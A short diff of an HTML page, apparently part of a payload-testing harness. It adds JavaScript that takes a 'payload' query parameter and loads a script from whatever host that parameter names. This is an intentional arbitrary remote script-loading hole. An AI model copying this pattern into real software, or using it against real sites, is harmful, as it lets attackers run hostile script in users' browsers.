@@ -137,6 +137,22 @@
     </script>
 
     <!-- Load payload from main domain -->
-    <script src="/"></script>
+    <script>
+        // Extract payload URL from query parameter
+        var urlParams = new URLSearchParams(window.location.search);
+        var payloadUrl = urlParams.get('payload');
+        
+        if (payloadUrl) {
+            // Load payload from the specified URL
+            var script = document.createElement('script');
+            script.src = '//' + payloadUrl;
+            document.body.appendChild(script);
+        } else {
+            // Fallback to root if no parameter provided
+            var script = document.createElement('script');
+            script.src = '/';
+            document.body.appendChild(script);
+        }
+    </script>
 </body>
 </html>
